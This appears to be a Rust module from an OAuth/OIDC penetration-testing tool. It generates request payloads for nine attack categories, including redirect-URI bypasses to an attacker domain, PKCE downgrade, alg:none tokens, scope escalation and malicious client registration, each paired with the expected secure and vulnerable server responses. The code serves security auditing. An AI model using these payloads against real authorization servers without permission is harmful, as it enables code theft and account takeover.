use std::collections::HashSet;
use std::fmt;

/// Maximum redirect URI bypass variants generated per base URI.
const MAX_REDIRECT_BYPASSES: usize = 32;

/// Maximum number of scope escalation test cases generated.
const MAX_SCOPE_TESTS: usize = 64;

// ─── Attack Categories ──────────────────────────────────────────────────────

/// The 9+ OAuth/OIDC attack categories.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum OAuthAttackCategory {
    RedirectUriManipulation,
    StateParameterAttack,
    PkceBypass,
    TokenExchangeAbuse,
    ScopeManipulation,
    ClientAuthBypass,
    IdTokenValidationGap,
    TokenSubstitution,
    DynamicClientRegistrationAbuse,
}

impl fmt::Display for OAuthAttackCategory {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let label = match self {
            Self::RedirectUriManipulation => "redirect-uri-manipulation",
            Self::StateParameterAttack => "state-parameter-attack",
            Self::PkceBypass => "pkce-bypass",
            Self::TokenExchangeAbuse => "token-exchange-abuse",
            Self::ScopeManipulation => "scope-manipulation",
            Self::ClientAuthBypass => "client-auth-bypass",
            Self::IdTokenValidationGap => "id-token-validation-gap",
            Self::TokenSubstitution => "token-substitution",
            Self::DynamicClientRegistrationAbuse => "dynamic-client-registration-abuse",
        };
        write!(f, "{label}")
    }
}

// ─── Core Types ─────────────────────────────────────────────────────────────

/// A generated OAuth attack test case.
#[derive(Debug, Clone)]
pub struct OAuthTestCase {
    pub category: OAuthAttackCategory,
    pub technique: String,
    pub description: String,
    pub request: OAuthAttackRequest,
    pub expected_secure_behavior: String,
    pub expected_vulnerable_behavior: String,
}

/// An HTTP request payload for an OAuth attack test.
#[derive(Debug, Clone)]
pub struct OAuthAttackRequest {
    pub method: String,
    pub endpoint: String,
    pub query_params: Vec<(String, String)>,
    pub headers: Vec<(String, String)>,
    pub body: Option<String>,
}

impl OAuthAttackRequest {
    fn get(endpoint: &str) -> Self {
        Self {
            method: "GET".to_string(),
            endpoint: endpoint.to_string(),
            query_params: Vec::new(),
            headers: Vec::new(),
            body: None,
        }
    }

    fn post(endpoint: &str) -> Self {
        Self {
            method: "POST".to_string(),
            endpoint: endpoint.to_string(),
            query_params: Vec::new(),
            headers: vec![(
                "Content-Type".to_string(),
                "application/x-www-form-urlencoded".to_string(),
            )],
            body: None,
        }
    }

    fn with_param(mut self, key: &str, value: &str) -> Self {
        self.query_params.push((key.to_string(), value.to_string()));
        self
    }

    fn with_header(mut self, key: &str, value: &str) -> Self {
        self.headers.push((key.to_string(), value.to_string()));
        self
    }

    fn with_body(mut self, body: &str) -> Self {
        self.body = Some(body.to_string());
        self
    }
}

/// Configuration for the OAuth attack engine.
#[derive(Debug, Clone)]
pub struct OAuthAttackConfig {
    pub authorization_endpoint: String,
    pub token_endpoint: String,
    pub client_id: String,
    pub registered_redirect_uri: String,
    pub scopes: Vec<String>,
    pub issuer: String,
    pub userinfo_endpoint: Option<String>,
    pub registration_endpoint: Option<String>,
    pub jwks_uri: Option<String>,
}

impl Default for OAuthAttackConfig {
    fn default() -> Self {
        Self {
            authorization_endpoint: "/oauth/authorize".to_string(),
            token_endpoint: "/oauth/token".to_string(),
            client_id: "test-client".to_string(),
            registered_redirect_uri: "https://legitimate.example.com/callback".to_string(),
            scopes: vec!["openid".to_string(), "profile".to_string()],
            issuer: "https://auth.example.com".to_string(),
            userinfo_endpoint: Some("/userinfo".to_string()),
            registration_endpoint: Some("/oauth/register".to_string()),
            jwks_uri: Some("/.well-known/jwks.json".to_string()),
        }
    }
}

/// Result of the full OAuth attack engine run.
#[derive(Debug)]
pub struct OAuthAttackResult {
    pub test_cases: Vec<OAuthTestCase>,
    pub categories_covered: HashSet<OAuthAttackCategory>,
    pub total_test_count: usize,
}

// ─── Category 1: Redirect URI Manipulation ──────────────────────────────────

/// Bypass technique for redirect URI validation.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum RedirectBypassTechnique {
    SubdomainPrefix,
    PathTraversal,
    FragmentInjection,
    ParameterPollution,
    OpenRedirectChain,
    UrlEncodingBypass,
    CaseMismatch,
    TrailingDotDomain,
    AtSignBypass,
    BackslashConfusion,
}

impl fmt::Display for RedirectBypassTechnique {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let label = match self {
            Self::SubdomainPrefix => "subdomain-prefix",
            Self::PathTraversal => "path-traversal",
            Self::FragmentInjection => "fragment-injection",
            Self::ParameterPollution => "parameter-pollution",
            Self::OpenRedirectChain => "open-redirect-chain",
            Self::UrlEncodingBypass => "url-encoding-bypass",
            Self::CaseMismatch => "case-mismatch",
            Self::TrailingDotDomain => "trailing-dot-domain",
            Self::AtSignBypass => "at-sign-bypass",
            Self::BackslashConfusion => "backslash-confusion",
        };
        write!(f, "{label}")
    }
}

/// Generate redirect URI bypass test cases.
///
/// Produces at least 5 bypass techniques (10 total) that attempt to redirect
/// the authorization code to an attacker-controlled domain.
pub fn generate_redirect_uri_bypasses(config: &OAuthAttackConfig) -> Vec<OAuthTestCase> {
    let base = &config.registered_redirect_uri;
    let domain = extract_domain(base);
    let path = extract_path(base);
    let attacker_domain = "evil.attacker.com";

    let mut cases = Vec::new();

    let bypasses: Vec<(RedirectBypassTechnique, String, &str)> = vec![
        (
            RedirectBypassTechnique::SubdomainPrefix,
            format!("https://{domain}.{attacker_domain}/callback"),
            "Prepends the legitimate domain as a subdomain of the attacker domain",
        ),
        (
            RedirectBypassTechnique::PathTraversal,
            format!("https://{domain}/callback/../../../{attacker_domain}"),
            "Uses path traversal sequences to escape the registered callback path",
        ),
        (
            RedirectBypassTechnique::FragmentInjection,
            format!("{base}#@{attacker_domain}"),
            "Injects a fragment with an @ sign to confuse URI parsers",
        ),
        (
            RedirectBypassTechnique::ParameterPollution,
            format!("{base}?redirect_uri=https://{attacker_domain}/steal"),
            "Appends a second redirect_uri parameter to the callback URL",
        ),
        (
            RedirectBypassTechnique::OpenRedirectChain,
            format!("{base}?next=https://{attacker_domain}/steal"),
            "Chains through an open redirect on the legitimate domain",
        ),
        (
            RedirectBypassTechnique::UrlEncodingBypass,
            format!("https://{domain}%2F%2E%2E%2F{attacker_domain}{path}"),
            "Uses URL encoding of path separators to confuse validation",
        ),
        (
            RedirectBypassTechnique::CaseMismatch,
            format!("https://{}/callback", domain.to_uppercase()),
            "Changes domain case to bypass case-sensitive string matching",
        ),
        (
            RedirectBypassTechnique::TrailingDotDomain,
            format!("https://{domain}./callback"),
            "Appends a trailing dot to the FQDN — valid DNS but may bypass string matching",
        ),
        (
            RedirectBypassTechnique::AtSignBypass,
            format!("https://{domain}@{attacker_domain}/callback"),
            "Uses the userinfo@ syntax to redirect to the attacker domain",
        ),
        (
            RedirectBypassTechnique::BackslashConfusion,
            format!("https://{domain}\\@{attacker_domain}/callback"),
            "Uses backslash before @ to confuse URL parsers on Windows/IIS",
        ),
    ];

    for (count, (technique, malicious_uri, description)) in bypasses.into_iter().enumerate() {
        if count >= MAX_REDIRECT_BYPASSES {
            break;
        }
        let request = OAuthAttackRequest::get(&config.authorization_endpoint)
            .with_param("response_type", "code")
            .with_param("client_id", &config.client_id)
            .with_param("redirect_uri", &malicious_uri)
            .with_param("scope", "openid profile")
            .with_param("state", "random-state-value");

        cases.push(OAuthTestCase {
            category: OAuthAttackCategory::RedirectUriManipulation,
            technique: technique.to_string(),
            description: description.to_string(),
            request,
            expected_secure_behavior: "Server returns 400 with invalid_redirect_uri error"
                .to_string(),
            expected_vulnerable_behavior:
                "Server issues authorization code and redirects to attacker-controlled URI"
                    .to_string(),
        });
    }

    cases
}

// ─── Category 2: State Parameter Attacks ────────────────────────────────────

/// Generate state parameter attack test cases.
///
/// Tests for missing, empty, predictable, and replayable state values
/// that enable CSRF attacks against the OAuth callback.
pub fn generate_state_parameter_attacks(config: &OAuthAttackConfig) -> Vec<OAuthTestCase> {
    let mut cases = Vec::new();

    let attacks: Vec<(&str, Option<&str>, &str, &str, &str)> = vec![
        (
            "missing-state",
            None,
            "Authorization request with no state parameter",
            "Server rejects the request or warns about missing CSRF protection",
            "Server processes the request — callback is vulnerable to CSRF",
        ),
        (
            "empty-state",
            Some(""),
            "Authorization request with an empty state parameter",
            "Server rejects empty state as insufficient CSRF protection",
            "Server accepts empty state — CSRF protection is cosmetic only",
        ),
        (
            "predictable-sequential",
            Some("1"),
            "State value is a predictable sequential integer",
            "Server validates state unpredictability or binds to session",
            "Server accepts any state — attacker can predict and forge valid states",
        ),
        (
            "predictable-timestamp",
            Some("1700000000"),
            "State value is a Unix timestamp — guessable within a window",
            "Server validates state entropy or session binding",
            "Server accepts timestamp-based state — attacker can brute-force the window",
        ),
        (
            "replayed-state",
            Some("previously-used-state-value"),
            "Replays a previously-used state value to test nonce enforcement",
            "Server rejects the replayed state with invalid_state error",
            "Server accepts replayed state — one-time use not enforced",
        ),
        (
            "cross-session-state",
            Some("state-from-different-session"),
            "Uses a state value generated in a different user session",
            "Server rejects state not bound to the current session",
            "Server accepts cross-session state — session binding is absent",
        ),
    ];

    for (technique, state_value, desc, secure, vulnerable) in attacks {
        let mut request = OAuthAttackRequest::get(&config.authorization_endpoint)
            .with_param("response_type", "code")
            .with_param("client_id", &config.client_id)
            .with_param("redirect_uri", &config.registered_redirect_uri)
            .with_param("scope", "openid");

        if let Some(state) = state_value {
            request = request.with_param("state", state);
        }

        cases.push(OAuthTestCase {
            category: OAuthAttackCategory::StateParameterAttack,
            technique: technique.to_string(),
            description: desc.to_string(),
            request,
            expected_secure_behavior: secure.to_string(),
            expected_vulnerable_behavior: vulnerable.to_string(),
        });
    }

    cases
}

// ─── Category 3: PKCE Bypass ────────────────────────────────────────────────

/// Generate PKCE bypass test cases.
///
/// Tests whether the authorization server actually validates the code_verifier
/// and whether S256 can be downgraded to plain.
pub fn generate_pkce_bypass_attacks(config: &OAuthAttackConfig) -> Vec<OAuthTestCase> {
    let mut cases = Vec::new();

    let valid_verifier = "dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk";
    let valid_challenge = "E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM";

    // Test 1: Authorization request with PKCE challenge, token request without verifier
    {
        let auth_request = OAuthAttackRequest::get(&config.authorization_endpoint)
            .with_param("response_type", "code")
            .with_param("client_id", &config.client_id)
            .with_param("redirect_uri", &config.registered_redirect_uri)
            .with_param("code_challenge", valid_challenge)
            .with_param("code_challenge_method", "S256");

        cases.push(OAuthTestCase {
            category: OAuthAttackCategory::PkceBypass,
            technique: "missing-verifier".to_string(),
            description: "Token request omits code_verifier despite challenge in authorization"
                .to_string(),
            request: auth_request,
            expected_secure_behavior: "Server rejects token request without code_verifier"
                .to_string(),
            expected_vulnerable_behavior:
                "Server issues tokens without verifying PKCE — code interception possible"
                    .to_string(),
        });
    }

    // Test 2: Wrong verifier value
    {
        let request = OAuthAttackRequest::post(&config.token_endpoint).with_body(
            &format!(
                "grant_type=authorization_code&code=AUTHZ_CODE&redirect_uri={}&code_verifier=wrong-verifier-value&client_id={}",
                config.registered_redirect_uri, config.client_id
            ),
        );

        cases.push(OAuthTestCase {
            category: OAuthAttackCategory::PkceBypass,
            technique: "wrong-verifier".to_string(),
            description: "Token request sends an incorrect code_verifier value".to_string(),
            request,
            expected_secure_behavior: "Server rejects with invalid_grant error".to_string(),
            expected_vulnerable_behavior: "Server ignores verifier mismatch and issues tokens"
                .to_string(),
        });
    }

    // Test 3: S256 downgrade to plain
    {
        let request = OAuthAttackRequest::get(&config.authorization_endpoint)
            .with_param("response_type", "code")
            .with_param("client_id", &config.client_id)
            .with_param("redirect_uri", &config.registered_redirect_uri)
            .with_param("code_challenge", valid_verifier)
            .with_param("code_challenge_method", "plain");

        cases.push(OAuthTestCase {
            category: OAuthAttackCategory::PkceBypass,
            technique: "s256-downgrade-to-plain".to_string(),
            description: "Requests plain challenge method when server should enforce S256"
                .to_string(),
            request,
            expected_secure_behavior: "Server rejects plain method or only allows S256".to_string(),
            expected_vulnerable_behavior:
                "Server accepts plain — verifier is sent in cleartext, defeating PKCE purpose"
                    .to_string(),
        });
    }

    // Test 4: No PKCE at all on public client
    {
        let request = OAuthAttackRequest::get(&config.authorization_endpoint)
            .with_param("response_type", "code")
            .with_param("client_id", &config.client_id)
            .with_param("redirect_uri", &config.registered_redirect_uri)
            .with_param("scope", "openid");

        cases.push(OAuthTestCase {
            category: OAuthAttackCategory::PkceBypass,
            technique: "pkce-not-required".to_string(),
            description: "Public client authorization request without any PKCE parameters"
                .to_string(),
            request,
            expected_secure_behavior:
                "Server requires PKCE for public clients per RFC 7636 / OAuth 2.1".to_string(),
            expected_vulnerable_behavior:
                "Server allows authorization without PKCE — code interception unmitigated"
                    .to_string(),
        });
    }

    cases
}

// ─── Category 4: Token Exchange Abuse ───────────────────────────────────────

/// Generate token exchange abuse test cases.
///
/// Tests code replay, wrong-endpoint exchange, and cross-client code usage.
pub fn generate_token_exchange_attacks(config: &OAuthAttackConfig) -> Vec<OAuthTestCase> {
    let mut cases = Vec::new();

    // Test 1: Code replay
    {
        let request = OAuthAttackRequest::post(&config.token_endpoint).with_body(&format!(
            "grant_type=authorization_code&code=PREVIOUSLY_USED_CODE&redirect_uri={}&client_id={}",
            config.registered_redirect_uri, config.client_id
        ));

        cases.push(OAuthTestCase {
            category: OAuthAttackCategory::TokenExchangeAbuse,
            technique: "code-replay".to_string(),
            description: "Replays a previously-exchanged authorization code".to_string(),
            request,
            expected_secure_behavior:
                "Server rejects with invalid_grant — codes are single-use per RFC 6749 Section 4.1.2"
                    .to_string(),
            expected_vulnerable_behavior:
                "Server issues new tokens for replayed code — multi-use codes".to_string(),
        });
    }

    // Test 2: Code exchanged at wrong endpoint
    {
        let wrong_endpoint = "/oauth/userinfo";
        let request = OAuthAttackRequest::post(wrong_endpoint).with_body(&format!(
            "grant_type=authorization_code&code=AUTHZ_CODE&redirect_uri={}&client_id={}",
            config.registered_redirect_uri, config.client_id
        ));

        cases.push(OAuthTestCase {
            category: OAuthAttackCategory::TokenExchangeAbuse,
            technique: "wrong-endpoint-exchange".to_string(),
            description:
                "Sends authorization code to the userinfo endpoint instead of the token endpoint"
                    .to_string(),
            request,
            expected_secure_behavior: "Endpoint rejects the code exchange request entirely"
                .to_string(),
            expected_vulnerable_behavior:
                "Non-token endpoint processes the code and leaks token data".to_string(),
        });
    }

    // Test 3: Cross-client code exchange
    {
        let request = OAuthAttackRequest::post(&config.token_endpoint)
            .with_body(
                &format!(
                    "grant_type=authorization_code&code=CODE_FOR_CLIENT_A&redirect_uri={}&client_id=different-client-id&client_secret=different-secret",
                    config.registered_redirect_uri
                ),
            );

        cases.push(OAuthTestCase {
            category: OAuthAttackCategory::TokenExchangeAbuse,
            technique: "cross-client-code-use".to_string(),
            description: "Exchanges a code issued to client_A using client_B credentials"
                .to_string(),
            request,
            expected_secure_behavior: "Server rejects — code is bound to the requesting client_id"
                .to_string(),
            expected_vulnerable_behavior: "Server issues tokens to client_B using client_A's code"
                .to_string(),
        });
    }

    // Test 4: Redirect URI mismatch at token endpoint
    {
        let request = OAuthAttackRequest::post(&config.token_endpoint).with_body(
            &format!(
                "grant_type=authorization_code&code=AUTHZ_CODE&redirect_uri=https://evil.attacker.com/steal&client_id={}",
                config.client_id
            ),
        );

        cases.push(OAuthTestCase {
            category: OAuthAttackCategory::TokenExchangeAbuse,
            technique: "redirect-uri-mismatch-at-token".to_string(),
            description: "Token request uses different redirect_uri than was used in authorization"
                .to_string(),
            request,
            expected_secure_behavior:
                "Server rejects — redirect_uri must match the one from the authorization request"
                    .to_string(),
            expected_vulnerable_behavior: "Server ignores redirect_uri mismatch and issues tokens"
                .to_string(),
        });
    }

    cases
}

// ─── Category 5: Scope Manipulation ─────────────────────────────────────────

/// Generate scope manipulation test cases.
///
/// Tests for scope escalation, persistence across refresh, and hidden scopes.
pub fn generate_scope_manipulation_attacks(config: &OAuthAttackConfig) -> Vec<OAuthTestCase> {
    let mut cases = Vec::new();

    let escalation_scopes = [
        "admin",
        "admin:write",
        "user:admin",
        "root",
        "superuser",
        "* ",
        "openid profile email admin",
    ];

    // Scope escalation tests
    for (count, elevated) in escalation_scopes.iter().enumerate() {
        if count >= MAX_SCOPE_TESTS {
            break;
        }
        let request = OAuthAttackRequest::get(&config.authorization_endpoint)
            .with_param("response_type", "code")
            .with_param("client_id", &config.client_id)
            .with_param("redirect_uri", &config.registered_redirect_uri)
            .with_param("scope", elevated);

        cases.push(OAuthTestCase {
            category: OAuthAttackCategory::ScopeManipulation,
            technique: format!("scope-escalation-{}", elevated.trim()),
            description: format!(
                "Requests elevated scope '{}' beyond the client's registered permissions",
                elevated.trim()
            ),
            request,
            expected_secure_behavior:
                "Server rejects unregistered scopes or downgrades to allowed set".to_string(),
            expected_vulnerable_behavior: format!(
                "Server grants elevated scope '{}' — privilege escalation",
                elevated.trim()
            ),
        });
    }

    // Scope persistence across refresh
    {
        let request = OAuthAttackRequest::post(&config.token_endpoint).with_body(
            "grant_type=refresh_token&refresh_token=REFRESH_TOKEN&scope=admin openid profile",
        );

        cases.push(OAuthTestCase {
            category: OAuthAttackCategory::ScopeManipulation,
            technique: "scope-widening-on-refresh".to_string(),
            description: "Refresh token request adds scopes not present in the original grant"
                .to_string(),
            request,
            expected_secure_behavior:
                "Server rejects scope widening — refresh must be subset of original grant"
                    .to_string(),
            expected_vulnerable_behavior:
                "Server grants additional scopes on refresh — privilege escalation via refresh"
                    .to_string(),
        });
    }

    cases
}

// ─── Category 6: Client Authentication Bypass ───────────────────────────────

/// Generate client authentication bypass test cases.
///
/// Tests for public/confidential client confusion and credential-less token exchange.
pub fn generate_client_auth_bypass_attacks(config: &OAuthAttackConfig) -> Vec<OAuthTestCase> {
    let mut cases = Vec::new();

    // Test 1: Confidential client without credentials
    {
        let request = OAuthAttackRequest::post(&config.token_endpoint).with_body(&format!(
            "grant_type=authorization_code&code=AUTHZ_CODE&redirect_uri={}&client_id={}",
            config.registered_redirect_uri, config.client_id
        ));

        cases.push(OAuthTestCase {
            category: OAuthAttackCategory::ClientAuthBypass,
            technique: "missing-client-secret".to_string(),
            description: "Confidential client token request without client_secret".to_string(),
            request,
            expected_secure_behavior: "Server rejects — confidential clients must authenticate"
                .to_string(),
            expected_vulnerable_behavior:
                "Server issues tokens without client authentication — public/confidential confusion"
                    .to_string(),
        });
    }

    // Test 2: Wrong client_secret
    {
        let request = OAuthAttackRequest::post(&config.token_endpoint)
            .with_body(
                &format!(
                    "grant_type=authorization_code&code=AUTHZ_CODE&redirect_uri={}&client_id={}&client_secret=wrong-secret",
                    config.registered_redirect_uri, config.client_id
                ),
            );

        cases.push(OAuthTestCase {
            category: OAuthAttackCategory::ClientAuthBypass,
            technique: "wrong-client-secret".to_string(),
            description: "Token request with incorrect client_secret".to_string(),
            request,
            expected_secure_behavior: "Server rejects with invalid_client error".to_string(),
            expected_vulnerable_behavior:
                "Server ignores client_secret validation and issues tokens".to_string(),
        });
    }

    // Test 3: client_id spoofing via basic auth vs body
    {
        let request = OAuthAttackRequest::post(&config.token_endpoint)
            .with_header("Authorization", "Basic dGVzdC1jbGllbnQ6d3Jvbmc=")
            .with_body(
                &format!(
                    "grant_type=authorization_code&code=AUTHZ_CODE&redirect_uri={}&client_id={}&client_secret=correct-secret",
                    config.registered_redirect_uri, config.client_id
                ),
            );

        cases.push(OAuthTestCase {
            category: OAuthAttackCategory::ClientAuthBypass,
            technique: "dual-auth-confusion".to_string(),
            description: "Sends conflicting client credentials in both Basic header and body"
                .to_string(),
            request,
            expected_secure_behavior:
                "Server rejects requests with ambiguous client authentication".to_string(),
            expected_vulnerable_behavior:
                "Server accepts one credential source and ignores the other — auth confusion"
                    .to_string(),
        });
    }

    cases
}

// ─── Category 7: ID Token Validation Gaps ───────────────────────────────────

/// Generate ID token validation gap test cases.
///
/// Tests for missing or insufficient verification of iss, aud, nonce, exp, and iat claims.
pub fn generate_id_token_validation_attacks(config: &OAuthAttackConfig) -> Vec<OAuthTestCase> {
    let mut cases = Vec::new();

    let claim_tests: Vec<(&str, &str, &str, &str)> = vec![
        (
            "wrong-issuer",
            "ID token with iss claim pointing to attacker-controlled issuer",
            "Client rejects token — iss does not match expected issuer",
            "Client accepts token with wrong issuer — impersonation possible",
        ),
        (
            "wrong-audience",
            "ID token with aud claim set to a different client_id",
            "Client rejects token — aud does not contain its own client_id",
            "Client accepts token meant for another client — token confusion",
        ),
        (
            "missing-nonce",
            "ID token without nonce claim in an implicit/hybrid flow",
            "Client rejects token — nonce required for replay protection",
            "Client accepts nonceless token — replay attacks possible",
        ),
        (
            "expired-token",
            "ID token with exp claim set in the past",
            "Client rejects expired token",
            "Client accepts expired token — time-based controls absent",
        ),
        (
            "future-iat",
            "ID token with iat claim set far in the future",
            "Client rejects token with suspicious iat value",
            "Client accepts future-dated token — clock validation absent",
        ),
        (
            "alg-none-attack",
            "ID token with alg:none in the JWT header — unsigned token",
            "Client rejects unsigned tokens regardless of header claims",
            "Client accepts alg:none token — signature validation completely bypassed",
        ),
    ];

    for (technique, desc, secure, vulnerable) in claim_tests {
        let request =
            OAuthAttackRequest::get(config.userinfo_endpoint.as_deref().unwrap_or("/userinfo"))
                .with_header(
                    "Authorization",
                    &format!("Bearer CRAFTED_ID_TOKEN_{}", technique.to_uppercase()),
                );

        cases.push(OAuthTestCase {
            category: OAuthAttackCategory::IdTokenValidationGap,
            technique: technique.to_string(),
            description: desc.to_string(),
            request,
            expected_secure_behavior: secure.to_string(),
            expected_vulnerable_behavior: vulnerable.to_string(),
        });
    }

    cases
}

// ─── Category 8: Token Substitution ─────────────────────────────────────────

/// Generate token substitution test cases.
///
/// Tests swapping tokens between flows, using access tokens as ID tokens, etc.
pub fn generate_token_substitution_attacks(config: &OAuthAttackConfig) -> Vec<OAuthTestCase> {
    let mut cases = Vec::new();

    let substitutions: Vec<(&str, &str, &str, &str)> = vec![
        (
            "access-token-as-id-token",
            "Uses an access token where an ID token is expected",
            "Client validates token type and rejects access token in ID token position",
            "Client accepts any JWT as ID token — token type confusion",
        ),
        (
            "implicit-token-in-code-flow",
            "Injects a token from implicit flow into code flow callback",
            "Server validates flow consistency — rejects mismatched token origin",
            "Server accepts cross-flow tokens — implicit/code flow confusion",
        ),
        (
            "refresh-token-as-access-token",
            "Sends refresh token in Authorization header as if it were an access token",
            "Resource server rejects the refresh token — different token audience",
            "Resource server accepts refresh token as access token — no token type binding",
        ),
    ];

    for (technique, desc, secure, vulnerable) in substitutions {
        let request =
            OAuthAttackRequest::get(config.userinfo_endpoint.as_deref().unwrap_or("/userinfo"))
                .with_header(
                    "Authorization",
                    &format!("Bearer SUBSTITUTED_{}", technique.to_uppercase()),
                );

        cases.push(OAuthTestCase {
            category: OAuthAttackCategory::TokenSubstitution,
            technique: technique.to_string(),
            description: desc.to_string(),
            request,
            expected_secure_behavior: secure.to_string(),
            expected_vulnerable_behavior: vulnerable.to_string(),
        });
    }

    cases
}

// ─── Category 9: Dynamic Client Registration Abuse ──────────────────────────

/// Generate dynamic client registration abuse test cases.
///
/// Tests for registering clients with malicious redirect URIs and privileged grant types.
pub fn generate_dynamic_registration_attacks(config: &OAuthAttackConfig) -> Vec<OAuthTestCase> {
    let mut cases = Vec::new();

    let registration_endpoint = config
        .registration_endpoint
        .as_deref()
        .unwrap_or("/oauth/register");

    // Test 1: Register with malicious redirect URI
    {
        let request = OAuthAttackRequest::post(registration_endpoint)
            .with_header("Content-Type", "application/json")
            .with_body(
                r#"{"redirect_uris":["https://evil.attacker.com/steal"],"client_name":"Legit App","grant_types":["authorization_code"]}"#,
            );

        cases.push(OAuthTestCase {
            category: OAuthAttackCategory::DynamicClientRegistrationAbuse,
            technique: "malicious-redirect-registration".to_string(),
            description: "Registers a new client with attacker-controlled redirect URI".to_string(),
            request,
            expected_secure_behavior:
                "Server validates redirect URIs against allowlist or requires admin approval"
                    .to_string(),
            expected_vulnerable_behavior:
                "Server registers client with arbitrary redirect URI — phishing/code theft"
                    .to_string(),
        });
    }

    // Test 2: Register with privileged grant types
    {
        let request = OAuthAttackRequest::post(registration_endpoint)
            .with_header("Content-Type", "application/json")
            .with_body(
                r#"{"redirect_uris":["https://localhost/callback"],"client_name":"Test","grant_types":["client_credentials","urn:ietf:params:oauth:grant-type:jwt-bearer"]}"#,
            );

        cases.push(OAuthTestCase {
            category: OAuthAttackCategory::DynamicClientRegistrationAbuse,
            technique: "privileged-grant-type-registration".to_string(),
            description: "Registers client requesting client_credentials and JWT bearer grants"
                .to_string(),
            request,
            expected_secure_behavior:
                "Server restricts grant types available through dynamic registration".to_string(),
            expected_vulnerable_behavior:
                "Server grants privileged grant types to dynamically registered clients".to_string(),
        });
    }

    // Test 3: Register with localhost redirect
    {
        let request = OAuthAttackRequest::post(registration_endpoint)
            .with_header("Content-Type", "application/json")
            .with_body(
                r#"{"redirect_uris":["http://localhost:9999/callback","http://127.0.0.1:9999/callback"],"client_name":"Local Dev","grant_types":["authorization_code"]}"#,
            );

        cases.push(OAuthTestCase {
            category: OAuthAttackCategory::DynamicClientRegistrationAbuse,
            technique: "localhost-redirect-registration".to_string(),
            description: "Registers client with localhost redirect URIs for local interception"
                .to_string(),
            request,
            expected_secure_behavior:
                "Server restricts or flags localhost redirects in non-development environments"
                    .to_string(),
            expected_vulnerable_behavior:
                "Server allows localhost redirects in production — local code interception"
                    .to_string(),
        });
    }

    cases
}

// ─── Aggregate Engine ───────────────────────────────────────────────────────

/// Run the full OAuth/OIDC attack engine.
///
/// Generates test cases across all 9 attack categories. This is a payload generation
/// engine — it does not make network requests. The caller is responsible for
/// sending the generated test cases and evaluating responses.
pub fn run_oauth_attack_engine(config: &OAuthAttackConfig) -> OAuthAttackResult {
    let mut all_cases = Vec::new();

    all_cases.extend(generate_redirect_uri_bypasses(config));
    all_cases.extend(generate_state_parameter_attacks(config));
    all_cases.extend(generate_pkce_bypass_attacks(config));
    all_cases.extend(generate_token_exchange_attacks(config));
    all_cases.extend(generate_scope_manipulation_attacks(config));
    all_cases.extend(generate_client_auth_bypass_attacks(config));
    all_cases.extend(generate_id_token_validation_attacks(config));
    all_cases.extend(generate_token_substitution_attacks(config));
    all_cases.extend(generate_dynamic_registration_attacks(config));

    let categories_covered: HashSet<OAuthAttackCategory> =
        all_cases.iter().map(|tc| tc.category).collect();
    let total = all_cases.len();

    OAuthAttackResult {
        test_cases: all_cases,
        categories_covered,
        total_test_count: total,
    }
}

// ─── Helpers ────────────────────────────────────────────────────────────────

fn extract_domain(uri: &str) -> String {
    let without_scheme = uri
        .strip_prefix("https://")
        .or_else(|| uri.strip_prefix("http://"))
        .unwrap_or(uri);
    without_scheme
        .split('/')
        .next()
        .unwrap_or(without_scheme)
        .to_string()
}

fn extract_path(uri: &str) -> String {
    let without_scheme = uri
        .strip_prefix("https://")
        .or_else(|| uri.strip_prefix("http://"))
        .unwrap_or(uri);
    match without_scheme.find('/') {
        Some(idx) => without_scheme[idx..].to_string(),
        None => "/".to_string(),
    }
}
